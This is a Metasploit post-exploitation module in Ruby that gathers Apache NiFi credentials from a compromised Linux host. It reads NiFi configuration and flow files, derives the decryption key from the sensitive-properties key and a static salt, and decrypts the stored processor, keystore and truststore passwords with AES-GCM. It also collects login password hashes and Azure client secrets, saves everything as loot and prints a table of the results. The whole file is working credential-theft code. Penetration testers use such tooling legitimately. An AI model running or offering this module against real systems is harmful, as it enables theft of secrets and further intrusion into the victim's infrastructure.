##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'NiFi Credentials Gather',
        'Description' => %q{
          This module will grab NiFi credentials from various files on Linux.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
          'Topaco', # crypto assist
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://stackoverflow.com/questions/77391210/python-vs-ruby-aes-pbkdf2'],
          ['URL', 'https://nifi.apache.org/docs/nifi-docs/html/administration-guide.html#nifi_sensitive_props_key']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('NIFI_PATH', [false, 'NiFi folder', '/opt/nifi/']),
        OptString.new('NIFI_PROPERTIES', [false, 'NiFi Properties file', '/opt/nifi/conf/nifi.properties']),
        OptString.new('NIFI_FLOW_JSON', [false, 'NiFi flow.json.gz file', '/opt/nifi/conf/flow.json.gz']),
        OptString.new('NIFI_IDENTITY', [false, 'NiFi login-identity-providers.xml file', '/opt/nifi/conf/login-identity-providers.xml']),
        OptString.new('NIFI_AUTHORIZERS', [false, 'NiFi authorizers file', '/opt/nifi/conf/authorizers.xml']),
        OptInt.new('ITERATIONS', [true, 'Encryption iterations', 160_000])
      ], self.class
    )
  end

  def authorizers_file
    return @authorizers_file if @authorizers_file

    [datastore['NIFI_authorizers'], "#{datastore['NIFI_PATH']}/conf/authorizers.xml"].each do |f|
      unless file_exist? f
        vprint_bad("#{f} not found")
        next
      end
      vprint_status("Found authorizers.xml file #{f}")
      unless readable? f
        vprint_bad("#{f} not readable")
        next
      end
      print_good("#{f} is readable!")
      @authorizers_file = f
    end
    @authorizers_file
  end

  def identity_file
    return @identity_file if @identity_file

    [datastore['NIFI_IDENTITY'], "#{datastore['NIFI_PATH']}/conf/login-identity-providers.xml"].each do |f|
      unless file_exist? f
        vprint_bad("#{f} not found")
        next
      end
      vprint_status("Found login-identity-providers.xml file #{f}")
      unless readable? f
        vprint_bad("#{f} not readable")
        next
      end
      print_good("#{f} is readable!")
      @identity_file = f
    end
    @identity_file
  end

  def properties_file
    return @properties_file if @properties_file

    [datastore['NIFI_PROPERTIES'], "#{datastore['NIFI_PATH']}/conf/nifi.properties"].each do |f|
      unless file_exist? f
        vprint_bad("#{f} not found")
        next
      end
      vprint_status("Found nifi.properties file #{f}")
      unless readable? f
        vprint_bad("#{f} not readable")
        next
      end
      print_good("#{f} is readable!")
      @properties_file = f
    end
    @properties_file
  end

  def flow_file
    return @flow_file if @flow_file

    [datastore['NIFI_FLOW_JSON'], "#{datastore['NIFI_PATH']}/conf/flow.json.gz"].each do |f|
      unless file_exist? f
        vprint_bad("#{f} not found")
        next
      end
      vprint_status("Found flow.json.gz file #{f}")
      unless readable? f
        vprint_bad("#{f} not readable")
        next
      end
      print_good("#{f} is readable!")
      @flow_file = f
    end
    @flow_file
  end

  def salt
    'NiFi Static Salt'
  end

  def decrypt(ciphertext, auth_tag, key, nonce)
    vprint_status("Nonce: #{nonce}")
    vprint_status("Auth Tag: #{auth_tag}")
    vprint_status("Ciphertext: #{ciphertext}")
    cipher = OpenSSL::Cipher.new('AES-256-GCM')
    cipher.decrypt
    cipher.key = key
    cipher.iv_len = 16
    cipher.iv = [nonce].pack('H*')
    cipher.auth_tag = [auth_tag].pack('H*')

    decrypted_text = cipher.update([ciphertext].pack('H*'))
    decrypted_text << cipher.final
    decrypted_text
  end

  def clean_enc_string(password)
    password[4, password.length - 5] # remove enc{ at the beginning and } at the end
  end

  def run
    unless ((flow_file && properties_file) || identity_file)
      fail_with(Failure::NotFound, 'Unable to find login-identity-providers.xml, nifi.properties and/or flow.json.gz files')
    end

    properties = read_file(properties_file)
    path = store_loot('nifi.properties', 'text/plain', session, properties, 'nifi.properties', 'nifi properties file')
    print_good("properties data saved in: #{path}")
    key = properties.scan(/^nifi.sensitive.props.key=(.+)$/).flatten.first.strip
    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if key.nil?
    print_good("Key: #{key}")
    algorithm = properties.scan(/^nifi.sensitive.props.algorithm=(\w+)$/).flatten.first.strip
    fail_with(Failure::NotFound, 'Unable to find nifi.properties and/or flow.json.gz files') if algorithm.nil?

    columns = ['Name', 'Username', 'Password', 'Information']
    table = Rex::Text::Table.new('Header' => 'NiFi Flow Data', 'Indent' => 1, 'Columns' => columns)

    gz = Zlib::GzipReader.new(StringIO.new(read_file(flow_file)))
    flow_json = gz.read
    gz.close

    path = store_loot('nifi.flow.json', 'application/json', session, flow_json, 'flow.json', 'nifi flow data')
    print_good("Encrypted data saved in: #{path}")

    flow_json = JSON.parse(flow_json)
    flow_json_string = JSON.pretty_generate(flow_json) # so we can save an unencrypted version as well

    # NIFI_PBKDF2_AES_GCM_256 is the default as of 1.14.0
    # leave this as a if statement so it can be expanded to include more algorithms in the future
    if algorithm == 'NIFI_PBKDF2_AES_GCM_256'
      # https://gist.github.com/tylerpace/8f64b7e00ffd9fb1ef5ea70df0f9442f
      decrypted_key = OpenSSL::PKCS5.pbkdf2_hmac(key, salt, datastore['ITERATIONS'], 32, OpenSSL::Digest.new('SHA512'))

      vprint_status('Checking root group processors')
      flow_json.dig('rootGroup', 'processors').each do |processor|
        next unless processor.dig('properties', 'Password')

        name = processor['name']
        username = processor.dig('properties', 'Username')
        url = processor.dig('properties', 'URL')
        password = clean_enc_string(processor.dig('properties', 'Password'))
        matches = password.match(/(?<nonce>\w{32})(?<ciphertext>\w+)(?<auth_tag>\w{32})/)
        next if matches.nil?

        password_decrypt = decrypt(matches[:ciphertext], matches[:auth_tag], decrypted_key, matches[:nonce])
        table << [name, username, password_decrypt, url]
        flow_json_string = flow_json_string.gsub(processor['properties']['Password'], password_decrypt)
      end

      vprint_status('Checking root group controller services')
      controller_services = flow_json.dig('rootGroup', 'controllerServices')

      controller_services.each do |controller_properties|
        controller_properties = controller_properties['properties']
        if controller_properties['Keystore Filename'] && controller_properties['Keystore Password']
          name = 'Keystore'
          username = controller_properties['Keystore Filename']
          password = clean_enc_string(controller_properties['Keystore Password'])
          matches = password.match(/(?<nonce>\w{32})(?<ciphertext>\w+)(?<auth_tag>\w{32})/)
          unless matches.nil?
            password_decrypt = decrypt(matches[:ciphertext], matches[:auth_tag], decrypted_key, matches[:nonce])
            table << [name, username, password_decrypt, '']
            flow_json_string = flow_json_string.gsub(controller_properties['Keystore Password'], password_decrypt)
          end
        end

        if controller_properties['Truststore Filename'] && controller_properties['Truststore Password']
          name = 'Truststore'
          username = controller_properties['Truststore Filename']
          password = clean_enc_string(controller_properties['Truststore Password'])
          matches = password.match(/(?<nonce>\w{32})(?<ciphertext>\w+)(?<auth_tag>\w{32})/)
          unless matches.nil?
            password_decrypt = decrypt(matches[:ciphertext], matches[:auth_tag], decrypted_key, matches[:nonce])
            table << [name, username, password_decrypt, "Truststore Type #{controller_properties['Truststore Type']}"]
            flow_json_string = flow_json_string.gsub(controller_properties['Truststore Password'], password_decrypt)
          end
        end

        next unless controller_properties['Truststore Filename'] && controller_properties['key-password']

        name = 'Key Password'
        username = controller_properties['Truststore Filename']
        password = clean_enc_string(controller_properties['key-password'])
        matches = password.match(/(?<nonce>\w{32})(?<ciphertext>\w+)(?<auth_tag>\w{32})/)
        next if matches.nil?

        password_decrypt = decrypt(matches[:ciphertext], matches[:auth_tag], decrypted_key, matches[:nonce])
        table << [name, username, password_decrypt, "Truststore Type #{controller_properties['Truststore Type']}"]
        flow_json_string = flow_json_string.gsub(controller_properties['key-password'], password_decrypt)
      end

    else
      print_bad("Processor for #{algorithm} not implemented in module. Use nifi-toolkit to potentially change algorithm.")
    end

    unless flow_json_string == JSON.pretty_generate(flow_json) # dont write if we didn't change anything
      path = store_loot('nifi.flow.decrypted.json', 'application/json', session, flow_json_string, 'flow.decrypted.json', 'nifi flow data decrypted')
      print_good("Decrypted data saved in: #{path}")
    end

    vprint_status('Checking identity file')
    if identity_file
      identity_content = read_file(identity_file)
      xml = Nokogiri::XML.parse(identity_content)

      xml.xpath('//loginIdentityProviders//provider').each do |c|
        name = c.xpath('identifier').text
        username = c.xpath('property[@name="Username"]').text
        hash = c.xpath('property[@name="Password"]').text
        next if (username.blank? || hash.blank?)

        table << [name, username, hash, 'From login-identity-providers.xml']

        credential_data = {
          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
          origin_type: :session,
          post_reference_name: refname,
          private_type: :nonreplayable_hash,
          private_data: hash,
          session_id: session_db_id,
          username: username,
          workspace_id: myworkspace_id
        }
        create_credential(credential_data)
      end
    end

    vprint_status('Checking authorizers file')
    if authorizers_file
      authorizers_content = read_file(authorizers_file)
      xml = Nokogiri::XML.parse(authorizers_content)

      xml.xpath('//authorizers//userGroupProvider').each do |c|
        next if c.xpath('property[@name="Client Secret"]').text.blank?

        name = c.xpath('identifier').text
        username = "Directory/Tenant ID: #{c.xpath('property[@name="Directory ID"]').text}" \
                   ", Application ID: #{c.xpath('property[@name="Application ID"]').text}"
        password = c.xpath('property[@name="Client Secret"]').text
        next if (username.blank? || hash.blank?)

        table << [name, username, password, 'From authorizers.xml']
      end
    end

    if !table.rows.empty?
      print_good('NiFi Flow Values')
      print_line(table.to_s)
    end
  end
end
